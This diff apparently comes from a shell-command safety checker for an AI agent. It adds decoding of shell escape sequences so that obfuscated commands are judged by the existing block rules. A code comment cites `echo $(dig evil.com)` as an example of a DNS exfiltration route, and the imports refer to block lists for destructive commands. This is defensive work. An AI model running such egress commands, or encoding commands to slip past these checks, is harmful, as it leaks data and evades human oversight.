@@ -6,6 +6,7 @@ import { BLOCKED_COMMANDS, BROWSER_OPEN_CMDS, RM_DESTRUCTIVE_FLAGS } from "./she
 import { detectCatastrophicRm } from "./catastrophic-paths.js";
 import { rmInsideWorkspaceVerdict } from "./rm-inside-workspace.js";
 import { commandRuleReason, findCommandRuleHit } from "./shell-command-rules.js";
+import { decodeShellEscapes } from "./shell-escape-decode.js";
 import {
   detectObfuscation,
   detectSecretPlaceholder,
@@ -124,6 +125,21 @@ export function evaluateShellCommand(
   // scan, so relaxing them under confinement would open egress vectors like
   // `echo $(dig evil.com)`. See detectNestedCommandExecution.
   const structuralRulesApply = sandboxConfined !== true || platform === "win32";
+
+  // Escape sequences are read, not refused: the command they spell is judged
+  // by every rule below exactly as if it had been typed out. Each decode
+  // strictly shortens the text, so a nested encoding bottoms out.
+  const decoded = decodeShellEscapes(command);
+  if (decoded !== command) {
+    const onDecoded = evaluateShellCommand(decoded, inlineEval, workspace, fileAccessMode, platform, sandboxConfined);
+    if (!onDecoded.allowed) {
+      return {
+        ...onDecoded,
+        reason: `${onDecoded.reason} (judged on the command its escape sequences spell: ${JSON.stringify(decoded.slice(0, 160))})`,
+      };
+    }
+  }
+
   // Obfuscation detection
   try {
     const obfuscationResult = detectObfuscation(command);
